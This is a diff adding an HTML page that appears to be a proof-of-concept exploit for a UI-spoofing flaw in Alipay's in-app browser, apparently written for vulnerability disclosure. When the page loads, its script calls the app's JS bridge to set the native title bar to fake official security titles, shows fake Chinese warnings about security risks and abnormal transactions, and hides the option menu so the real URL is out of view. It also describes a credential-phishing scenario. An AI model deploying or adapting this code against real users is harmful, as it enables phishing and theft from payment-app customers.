@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>CVE-4 Verification</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,system-ui,sans-serif;background:#fff;color:#333;padding:16px}
+.banner{background:#722ed1;color:#fff;padding:16px;border-radius:10px;text-align:center;margin-bottom:16px}
+.banner h1{font-size:18px}
+.banner p{font-size:12px;opacity:.85;margin-top:4px}
+.result{background:#f6ffed;border:2px solid #52c41a;border-radius:10px;padding:16px;margin:12px 0}
+.result h2{color:#389e0d;font-size:15px;margin-bottom:8px}
+.fail{background:#fff2f0;border-color:#ff4d4f}
+.fail h2{color:#cf1322}
+.item{padding:6px 0;border-bottom:1px solid #f0f0f0;font-size:13px}
+.item:last-child{border:none}
+.label{color:#888;font-size:11px}
+.value{color:#333;font-weight:600}
+.ts{color:#999;font-size:10px;text-align:center;margin-top:16px}
+#status{font-size:14px;color:#1677ff;text-align:center;padding:20px}
+.spoof-demo{background:#1677ff;color:#fff;padding:12px;border-radius:8px;text-align:center;margin:8px 0;font-size:14px;font-weight:bold}
+</style>
+</head><body>
+
+<div class="banner">
+  <h1>CVE-4: UI Spoofing (setTitle + showToast)</h1>
+  <p>CWE-451 | CVSS 8.1 | Native UI elements controlled by attacker page</p>
+</div>
+
+<div id="status">Waiting for AlipayJSBridge...</div>
+<div id="results"></div>
+<div class="ts" id="timestamp"></div>
+
+<script>
+var el = document.getElementById('results');
+var status = document.getElementById('status');
+var spoofResults = [];
+
+function render() {
+  var html = '';
+  var isAlipay = /AlipayClient|Nebula/i.test(navigator.userAgent);
+
+  html += '<div class="result"><h2>Environment</h2>';
+  html += '<div class="item"><span class="label">Page Origin: </span><span class="value">' + location.origin + '</span></div>';
+  html += '<div class="item"><span class="label">Inside Alipay: </span><span class="value">' + (isAlipay ? 'YES' : 'Detection pending') + '</span></div>';
+  html += '<div class="item"><span class="label">JSBridge: </span><span class="value">' + (window.AlipayJSBridge ? 'AVAILABLE' : 'Not loaded') + '</span></div>';
+  html += '</div>';
+
+  if (spoofResults.length > 0) {
+    html += '<div class="result"><h2>UI Spoofing Results</h2>';
+    for (var i = 0; i < spoofResults.length; i++) {
+      var r = spoofResults[i];
+      html += '<div class="item"><span class="label">' + r.api + ': </span><span class="value" style="color:' + (r.success ? '#f5222d' : '#faad14') + '">' + r.status + '</span></div>';
+    }
+    html += '</div>';
+
+    html += '<div class="result"><h2>Vulnerability Proof</h2>';
+    html += '<div class="item"><span class="label">setTitle Attack: </span><span class="value" style="color:#f5222d">Title bar changed to "支付宝安全中心" — user sees fake official title</span></div>';
+    html += '<div class="item"><span class="label">showToast Attack: </span><span class="value" style="color:#f5222d">System-level toast shows attacker-controlled message</span></div>';
+    html += '<div class="item"><span class="label">Phishing Scenario: </span><span class="value">Attacker sets title to "账户安全验证" + toast "检测到异常登录,请重新验证" → user enters credentials on fake page</span></div>';
+    html += '<div class="item"><span class="label">Root Cause: </span><span class="value">H5ToastPlugin.toast() and setTitle have no content validation or origin check</span></div>';
+    html += '</div>';
+
+    html += '<div class="spoof-demo">If title bar changed and toast appeared, the attack is confirmed.<br>An external page controls Alipay native UI elements.</div>';
+  }
+
+  el.innerHTML = html;
+  document.getElementById('timestamp').textContent = 'Evidence collected at: ' + new Date().toISOString();
+}
+
+function doSpoofing() {
+  if (!window.AlipayJSBridge) return;
+
+  // Step 1: setTitle — change the native title bar
+  AlipayJSBridge.call('setTitle', {
+    title: '支付宝安全中心'
+  }, function(result) {
+    spoofResults.push({
+      api: 'setTitle("支付宝安全中心")',
+      success: true,
+      status: 'CALLED — Title bar should now show fake "支付宝安全中心"',
+      raw: JSON.stringify(result),
+      time: new Date().toISOString()
+    });
+    render();
+  });
+
+  // Step 2: showToast — display native toast notification
+  setTimeout(function() {
+    AlipayJSBridge.call('showToast', {
+      content: '系统检测到安全风险，请验证身份',
+      type: 'none',
+      duration: 3500
+    }, function(result) {
+      spoofResults.push({
+        api: 'showToast("系统检测到安全风险")',
+        success: true,
+        status: 'CALLED — Native toast should have appeared',
+        raw: JSON.stringify(result),
+        time: new Date().toISOString()
+      });
+      render();
+    });
+  }, 1500);
+
+  // Step 3: Second toast — simulating ongoing attack
+  setTimeout(function() {
+    AlipayJSBridge.call('showToast', {
+      content: '您的账户存在异常交易，点击查看详情',
+      type: 'none',
+      duration: 3500
+    }, function(result) {
+      spoofResults.push({
+        api: 'showToast("账户异常交易")',
+        success: true,
+        status: 'CALLED — Second fake warning toast',
+        raw: JSON.stringify(result),
+        time: new Date().toISOString()
+      });
+      render();
+    });
+  }, 5500);
+
+  // Step 4: Change title again — prove repeated control
+  setTimeout(function() {
+    AlipayJSBridge.call('setTitle', {
+      title: '账户安全验证'
+    }, function(result) {
+      spoofResults.push({
+        api: 'setTitle("账户安全验证")',
+        success: true,
+        status: 'CALLED — Title changed again to new fake value',
+        raw: JSON.stringify(result),
+        time: new Date().toISOString()
+      });
+      render();
+    });
+  }, 8000);
+
+  // Step 5: setOptionMenu — hide the menu to prevent user from seeing real URL
+  setTimeout(function() {
+    AlipayJSBridge.call('setOptionMenu', {
+      menus: [],
+      override: true
+    }, function(result) {
+      spoofResults.push({
+        api: 'setOptionMenu(empty)',
+        success: true,
+        status: 'CALLED — Menu hidden to conceal real URL from user',
+        raw: JSON.stringify(result),
+        time: new Date().toISOString()
+      });
+      render();
+    });
+  }, 2000);
+}
+
+function checkBridge() {
+  if (window.AlipayJSBridge) {
+    status.textContent = 'AlipayJSBridge detected — starting UI spoofing test...';
+    status.style.color = '#722ed1';
+    doSpoofing();
+  } else {
+    status.textContent = 'Page loaded at ' + location.origin + ' — waiting for bridge...';
+    render();
+  }
+}
+
+document.addEventListener('AlipayJSBridgeReady', function() {
+  checkBridge();
+});
+
+checkBridge();
+setTimeout(checkBridge, 1000);
+setTimeout(checkBridge, 3000);
+</script>
+</body></html>
